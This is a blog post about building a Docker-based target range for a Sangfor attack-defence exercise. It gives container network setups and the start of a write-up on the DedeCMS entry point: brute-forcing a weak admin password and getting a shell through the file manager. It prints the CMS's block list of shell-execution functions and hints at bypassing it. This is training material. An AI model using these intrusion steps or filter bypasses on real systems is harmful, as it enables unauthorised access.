@@ -1,0 +1,346 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.9.1"><title>深信服云对抗靶机设计思路</title><meta name="title" content="深信服云对抗靶机设计思路"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/sangfor_cloud_confrontation/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/sangfor_cloud_confrontation/"><meta property="og:title" content="深信服云对抗靶机设计思路"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/sangfor_cloud_confrontation/"><meta property="twitter:title" content="深信服云对抗靶机设计思路"><meta property="twitter:description" content><script type="module">document.addEventListener("DOMContentLoaded",()=>{const a=document.getElementById("article");if(a){const r=a.getElementsByTagName("img");Array.from(r).forEach((e,n)=>{e.alt||(e.alt=`文章配图 ${n+1}`);const t=document.createElement("a");t.setAttribute("data-fancybox","gallery"),t.setAttribute("aria-label",`查看大图：${e.alt}`),t.href=e.src,e.parentNode?.insertBefore(t,e),t.appendChild(e)})}});</script><link rel="stylesheet" href="/_astro/_slug_.C-AkVzb2.css">
+<link rel="stylesheet" href="/_astro/waline.nkDt9Ep-.css">
+<link rel="stylesheet" href="/_astro/_slug_.Dk_-7yif.css">
+<link rel="stylesheet" href="/_astro/_slug_.DEy1TFvp.css">
+<style>#waline[data-astro-cid-cjuph4ok]{margin:2rem 0}
+</style></head> <body class="bg-white"> <header class="relative m-0 px-4 py-4 mb-8" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <button id="menu-btn" class="md:hidden flex flex-col space-y-1 p-2 text-black" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white rounded-xl shadow-2xl border border-gray-100 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),a=document.getElementById("menu");e?.addEventListener("click",()=>{const t=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",t?"false":"true"),e.setAttribute("aria-label",t?"打开菜单":"关闭菜单"),a?.classList.toggle("hidden"),e.classList.toggle("open")});e?.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())});document.addEventListener("keydown",t=>{t.key==="Escape"&&!a?.classList.contains("hidden")&&(a?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单"),e?.focus())});document.addEventListener("click",t=>{!e?.contains(t.target)&&!a?.contains(t.target)&&(a?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单"))});</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 mb-6 tracking-tight leading-tight"> 深信服云对抗靶机设计思路 </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2024-08-31T20:00:00.000Z" class="text-[#86868b] tracking-wide"> <time datetime="2024-08-31T20:00:00.000Z"> Aug 31, 2024 </time> </time>  <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] tracking-wide" aria-label="阅读时间 11 min read">11 min read</span>   <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/文章.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 文章 下的所有文章"> 文章 </a>  </nav>   <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/网络安全.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a> <span class="text-[#d2d2d7]" aria-hidden="true">·</span> <a href="/tags/Writeup.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 Writeup 下的所有文章"> Writeup </a>  </nav>  </div> </header>  <nav class="toc" aria-label="文章目录" role="navigation" data-astro-cid-woz2nwfv> <h2 class="toc-title" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#写在前面" class="toc-link" aria-label="跳转到：写在前面" data-astro-cid-woz2nwfv> 1. 写在前面 </a>  </li><li data-astro-cid-woz2nwfv> <a href="#设计思路" class="toc-link" aria-label="跳转到：设计思路" data-astro-cid-woz2nwfv> 2. 设计思路 </a>  </li><li data-astro-cid-woz2nwfv> <a href="#靶机启动" class="toc-link" aria-label="跳转到：靶机启动" data-astro-cid-woz2nwfv> 3. 靶机启动 </a>  </li><li data-astro-cid-woz2nwfv> <a href="#writeup" class="toc-link" aria-label="跳转到：Writeup" data-astro-cid-woz2nwfv> 4. Writeup </a> <ol class="toc-sublist" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#织梦内容管理系统" class="toc-link" aria-label="跳转到：织梦内容管理系统" data-astro-cid-woz2nwfv> 4.1. 织梦内容管理系统 </a> </li><li data-astro-cid-woz2nwfv> <a href="#信呼协同办公系统" class="toc-link" aria-label="跳转到：信呼协同办公系统" data-astro-cid-woz2nwfv> 4.2. 信呼协同办公系统 </a> </li><li data-astro-cid-woz2nwfv> <a href="#redis-未授权访问" class="toc-link" aria-label="跳转到：Redis 未授权访问" data-astro-cid-woz2nwfv> 4.3. Redis 未授权访问 </a> </li><li data-astro-cid-woz2nwfv> <a href="#s2-046-命令执行" class="toc-link" aria-label="跳转到：S2-046 命令执行" data-astro-cid-woz2nwfv> 4.4. S2-046 命令执行 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#写在后面" class="toc-link" aria-label="跳转到：写在后面" data-astro-cid-woz2nwfv> 5. 写在后面 </a>  </li> </ol> </nav>  <script type="module">document.querySelectorAll(".toc-link").forEach(o=>{o.addEventListener("click",t=>{t.preventDefault();const e=o.getAttribute("href")?.slice(1);if(e){const i=document.getElementById(e);if(i){const c=i.getBoundingClientRect().top+window.pageYOffset-100;window.scrollTo({top:c,behavior:"smooth"})}}})});const s=new IntersectionObserver(o=>{const t=o.filter(e=>e.isIntersecting);if(t.length>0){const i=t.reduce((n,c)=>n.boundingClientRect.top<c.boundingClientRect.top?n:c).target.id;document.querySelectorAll(".toc-link.active").forEach(n=>n.classList.remove("active"));const r=document.querySelector(`.toc-link[href="#${i}"]`);r&&r.classList.add("active")}},{rootMargin:"-10% 0px -70% 0px",threshold:[0,.5,1]});document.querySelectorAll(".toc-link").forEach(o=>{const t=o.getAttribute("href")?.slice(1);if(t){const e=document.getElementById(t);e&&s.observe(e)}});</script>  <div class="fancybox-container">  <section id="article" class="prose prose-lg max-w-none" aria-label="文章正文">   <h2 id="写在前面">写在前面</h2>
+<p>最近应邀参加了深信服云对抗活动，分为 <code>靶机搭建</code> 和 <code>攻击&#x26;防御</code>两个阶段。博主负责 <code>靶机搭建</code> 阶段，其中赛方要求</p>
+<ol>
+<li>
+<p>尽可能地使用 Docker 容器化进行搭建</p>
+<p>环境：Centos 7.6, Docker 20.0</p>
+</li>
+<li>
+<p>需要存在内网环境（靶机 A -> 靶机 B）</p>
+<p>其中，靶机 A 对外映射了全部端口，而靶机 B 仅对外映射了 8000-8004 端口。<!--more--></p>
+</li>
+</ol>
+<h2 id="设计思路">设计思路</h2>
+<p>由于整个靶机不出网，所以博主推荐的思路是本地搭建完成之后，将容器导出为 <code>.tar</code> 格式，并通过 SSH 上传至靶机中</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line" data-line="1"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> save</span><span style="color:#79B8FF"> -o</span><span style="color:#9ECBFF"> filename.tar</span><span style="color:#9ECBFF"> iami233/dedecms:latest</span><span style="color:#E1E4E8"> </span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> load</span><span style="color:#79B8FF"> -i</span><span style="color:#9ECBFF"> filename.tar</span></span></code></pre>
+<p>主办方在赛事规则中指出，靶机设计时需要通过控制靶机 A 以实现攻击靶机 B。但博主认为，完全可以利用 Docker 内置的网络划分功能来实现这一目标，所以未完全按照官方要求进行设计。</p>
+<p>另外，如果要在多台宿主机之间通过容器化搭建多层渗透环境，博主觉得意义并不大。除非将 Docker 容器置于特权模式下，并实现逃逸至宿主机，以进行提权、搭建跳板等操作，但这可能会让问题变得过于复杂（有些舍本逐末的感觉？）。</p>
+<p>因此，博主最终决定全程在靶机 A 中进行靶机的设计。在整套靶机的设计中，博主将最难的点放在了入口（毕竟平时打攻防的时候确实口子难撕🤣），其他三个靶机基本上都是 CVE 漏洞，只要能将隧道搭建出来，基本可以打穿。</p>
+<p>由于整个云对抗正值全国常态化护网期间，靶机对外进行了访问收敛，需通过 aTrust 进行中转连接。但攻击机和靶机 A 肯定是互通的，所以整体的设计拓扑如下所示。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="center">名称</th><th align="center">地址</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">DedeCMS</td><td align="center">10.23.76.101（入口）/ 192.168.100.2</td><td align="center">命令执行</td></tr><tr><td align="center">信呼OA</td><td align="center">192.168.100.3 / 10.10.10.2</td><td align="center">文件上传</td></tr><tr><td align="center">Redis</td><td align="center">10.10.10.3</td><td align="center">未授权访问</td></tr><tr><td align="center">Struts2</td><td align="center">10.10.10.4</td><td align="center">命令执行</td></tr></tbody></table>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/sxf.png" alt="img"></p>
+<h2 id="靶机启动">靶机启动</h2>
+<p>这里仅仅给大家提供一下 Docker CLI 和 Docker-compose 的启动示例，具体的镜像地址就不放出来了。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line" data-line="1"><span style="color:#6A737D"># 创建网络</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> network</span><span style="color:#9ECBFF"> create</span><span style="color:#79B8FF"> --driver</span><span style="color:#9ECBFF"> bridge</span><span style="color:#79B8FF"> --subnet</span><span style="color:#9ECBFF"> 192.168.100.0/24</span><span style="color:#9ECBFF"> entry</span></span>
+<span class="line" data-line="3"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> network</span><span style="color:#9ECBFF"> create</span><span style="color:#79B8FF"> --driver</span><span style="color:#9ECBFF"> bridge</span><span style="color:#79B8FF"> --internal</span><span style="color:#79B8FF"> --subnet</span><span style="color:#9ECBFF"> 10.10.10.0/24</span><span style="color:#9ECBFF"> sub-1</span></span>
+<span class="line" data-line="4"><span style="color:#6A737D"># 启动容器</span></span>
+<span class="line" data-line="5"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> run</span><span style="color:#79B8FF"> -d</span><span style="color:#79B8FF"> --name</span><span style="color:#9ECBFF"> dedecms</span><span style="color:#79B8FF"> --network</span><span style="color:#9ECBFF"> entry</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> 80:80</span><span style="color:#79B8FF"> -e</span><span style="color:#9ECBFF"> FLAG=flag{test_flag}</span><span style="color:#9ECBFF"> 镜像名称</span></span>
+<span class="line" data-line="6"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> run</span><span style="color:#79B8FF"> -d</span><span style="color:#79B8FF"> --name</span><span style="color:#9ECBFF"> xinhu</span><span style="color:#79B8FF"> --network</span><span style="color:#9ECBFF"> entry</span><span style="color:#79B8FF"> -e</span><span style="color:#9ECBFF"> FLAG=flag{test_flag}</span><span style="color:#9ECBFF"> 镜像名称</span></span>
+<span class="line" data-line="7"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> network</span><span style="color:#9ECBFF"> connect</span><span style="color:#9ECBFF"> sub-1</span><span style="color:#9ECBFF"> xinhu</span></span>
+<span class="line" data-line="8"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> run</span><span style="color:#79B8FF"> -d</span><span style="color:#79B8FF"> --name</span><span style="color:#9ECBFF"> redis</span><span style="color:#79B8FF"> --network</span><span style="color:#9ECBFF"> sub-1</span><span style="color:#9ECBFF"> 镜像名称</span></span>
+<span class="line" data-line="9"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> run</span><span style="color:#79B8FF"> -d</span><span style="color:#79B8FF"> --name</span><span style="color:#9ECBFF"> struts2</span><span style="color:#79B8FF"> --network</span><span style="color:#9ECBFF"> sub-1</span><span style="color:#9ECBFF"> 镜像名称</span></span></code></pre>
+<p>当然我们也可以手动下载 <code>docker-compose</code> 并上传到靶机后，使用 <code>docker-compose.yaml</code> 来启动容器</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line" data-line="1"><span style="color:#6A737D"># 这里现在本机下载 docker-compose</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">https://github.com/docker/compose/releases/download/v2.29.2/docker-compose-linux-x86_64</span></span>
+<span class="line" data-line="3"><span style="color:#6A737D"># 然后上传到靶机中，赋予 可执行 的权限</span></span>
+<span class="line" data-line="4"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> chmod</span><span style="color:#9ECBFF"> +x</span><span style="color:#9ECBFF"> /usr/local/bin/docker-compose</span></span>
+<span class="line" data-line="5"><span style="color:#6A737D"># 查看 docker-compose 版本</span></span>
+<span class="line" data-line="6"><span style="color:#B392F0">docker-compose</span><span style="color:#9ECBFF"> version</span></span></code></pre>
+<p>具体靶机的启动脚本如下所示</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="yaml"><code><span class="line" data-line="1"><span style="color:#85E89D">version</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"3"</span></span>
+<span class="line" data-line="2"><span style="color:#85E89D">services</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="3"><span style="color:#85E89D">  dedecms</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="4"><span style="color:#85E89D">    build</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">./dedecms</span></span>
+<span class="line" data-line="5"><span style="color:#85E89D">    ports</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">    - </span><span style="color:#9ECBFF">"80:80"</span></span>
+<span class="line" data-line="7"><span style="color:#85E89D">    environment</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="8"><span style="color:#85E89D">      FLAG</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"flag{test_flag}"</span></span>
+<span class="line" data-line="9"><span style="color:#85E89D">    networks</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">    - </span><span style="color:#9ECBFF">entry</span></span>
+<span class="line" data-line="11"><span style="color:#85E89D">  xinhu</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="12"><span style="color:#85E89D">    build</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">./xinhu</span></span>
+<span class="line" data-line="13"><span style="color:#85E89D">    environment</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="14"><span style="color:#85E89D">      FLAG</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"flag{test_flag}"</span></span>
+<span class="line" data-line="15"><span style="color:#85E89D">    networks</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">    - </span><span style="color:#9ECBFF">entry</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">    - </span><span style="color:#9ECBFF">sub-1</span></span>
+<span class="line" data-line="18"><span style="color:#85E89D">  redis</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="19"><span style="color:#85E89D">    build</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">./redis</span></span>
+<span class="line" data-line="20"><span style="color:#85E89D">    networks</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">    - </span><span style="color:#9ECBFF">sub-1</span></span>
+<span class="line" data-line="22"><span style="color:#85E89D">  struts2</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="23"><span style="color:#85E89D">    build</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">./struts2</span></span>
+<span class="line" data-line="24"><span style="color:#85E89D">    networks</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="25"><span style="color:#E1E4E8">    - </span><span style="color:#9ECBFF">sub-1</span></span>
+<span class="line" data-line="26"></span>
+<span class="line" data-line="27"><span style="color:#85E89D">networks</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="28"><span style="color:#85E89D">  entry</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="29"><span style="color:#85E89D">    driver</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">bridge</span></span>
+<span class="line" data-line="30"><span style="color:#85E89D">    ipam</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="31"><span style="color:#85E89D">      config</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="32"><span style="color:#E1E4E8">      - </span><span style="color:#85E89D">subnet</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">192.168.100.0/24</span></span>
+<span class="line" data-line="33"></span>
+<span class="line" data-line="34"><span style="color:#85E89D">  sub-1</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="35"><span style="color:#85E89D">    driver</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">bridge</span></span>
+<span class="line" data-line="36"><span style="color:#85E89D">    internal</span><span style="color:#E1E4E8">: </span><span style="color:#79B8FF">true</span></span>
+<span class="line" data-line="37"><span style="color:#85E89D">    ipam</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="38"><span style="color:#85E89D">      config</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="39"><span style="color:#E1E4E8">      - </span><span style="color:#85E89D">subnet</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">10.10.10.0/24</span></span></code></pre>
+<h2 id="writeup">Writeup</h2>
+<h3 id="织梦内容管理系统">织梦内容管理系统</h3>
+<p>访问默认路径 <code>/dede</code> 成功进入后台登陆页面。通过网站的文章可以得到作者名，将其当作用户名进行爆破，得到密码 <code>admin</code></p>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240829162331626.png" alt="image-20240829162331626"></p>
+<p>进入后台后利用 <code>文件式管理器</code> 中 <code>新建文件</code> 功能进行 <code>GetShell</code>（这里需要找最新版 <code>DedeCMS</code> 审计一下，其实 CTF 打多了应该也有很多的绕过手法，例如无字母数字RCE、字符拼接等）</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#6A737D">// dede/file_manage_control.php</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">$str </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> preg_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"#(/\*)[\s\S]*(\*/)#i"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">, $str);</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">global</span><span style="color:#E1E4E8"> $cfg_disable_funs;</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">$cfg_disable_funs </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> isset</span><span style="color:#E1E4E8">($cfg_disable_funs) </span><span style="color:#F97583">?</span><span style="color:#E1E4E8"> $cfg_disable_funs </span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 'phpinfoevalassertexecpassthrushell_execsystemproc_openpopencurl_execcurl_multi_execparse_ini_fileshow_sourcefile_put_contentsfsockopenfopenfwritepreg_replace'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">$cfg_disable_funs </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $cfg_disable_funs</span><span style="color:#F97583">.</span><span style="color:#9ECBFF">'[$]GLOBALS[$]_GET[$]_POST[$]_REQUEST[$]_FILES[$]_COOKIE[$]_SERVERincluderequirecreate_functionarray_mapcall_user_funccall_user_func_arrayarray_filertgetallheaders'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">foreach</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">explode</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">, $cfg_disable_funs) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> $value) {</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">    $value </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">" "</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">, $value);</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#79B8FF">empty</span><span style="color:#E1E4E8">($value) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#79B8FF"> preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"#[^a-z]+['</span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">]*{</span><span style="color:#E1E4E8">$value</span><span style="color:#9ECBFF">}['</span><span style="color:#79B8FF">\"</span><span style="color:#9ECBFF">]*[\s]*[([{']#i"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"{</span><span style="color:#E1E4E8">$str</span><span style="color:#9ECBFF">}"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">        $str </span><span style="color:#F97583">=</span><span style="color:#B392F0"> dede_htmlspecialchars</span><span style="color:#E1E4E8">($str);</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"DedeCMS提示：当前页面中存在恶意代码！&#x3C;pre>{</span><span style="color:#E1E4E8">$str</span><span style="color:#9ECBFF">}&#x3C;/pre>"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="13"><span style="color:#F97583">if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"#^[\s\S]+&#x3C;\?(php|=)?[\s]+#i"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"{</span><span style="color:#E1E4E8">$str</span><span style="color:#9ECBFF">}"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="14"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"{</span><span style="color:#E1E4E8">$str</span><span style="color:#9ECBFF">}"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">        $str </span><span style="color:#F97583">=</span><span style="color:#B392F0"> dede_htmlspecialchars</span><span style="color:#E1E4E8">($str);</span></span>
+<span class="line" data-line="16"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"DedeCMS提示：当前页面中存在恶意代码！&#x3C;pre>{</span><span style="color:#E1E4E8">$str</span><span style="color:#9ECBFF">}&#x3C;/pre>"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="18"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"{</span><span style="color:#E1E4E8">$str</span><span style="color:#9ECBFF">}"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="19"><span style="color:#E1E4E8">        $str </span><span style="color:#F97583">=</span><span style="color:#B392F0"> dede_htmlspecialchars</span><span style="color:#E1E4E8">($str);</span></span>
+<span class="line" data-line="20"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"DedeCMS提示：当前页面中存在恶意代码！&#x3C;pre>{</span><span style="color:#E1E4E8">$str</span><span style="color:#9ECBFF">}&#x3C;/pre>"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="22"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"#[`][\s\S]*[`]#i"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"{</span><span style="color:#E1E4E8">$str</span><span style="color:#9ECBFF">}"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">        $str </span><span style="color:#F97583">=</span><span style="color:#B392F0"> dede_htmlspecialchars</span><span style="color:#E1E4E8">($str);</span></span>
+<span class="line" data-line="24"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"DedeCMS提示：当前页面中存在恶意代码！&#x3C;pre>{</span><span style="color:#E1E4E8">$str</span><span style="color:#9ECBFF">}&#x3C;/pre>"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="25"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p><img src="https://img.5ime.cn/sangfor_cloud_confrontation/image-20240803214820450.png" alt="image-20240803214820450"></p>
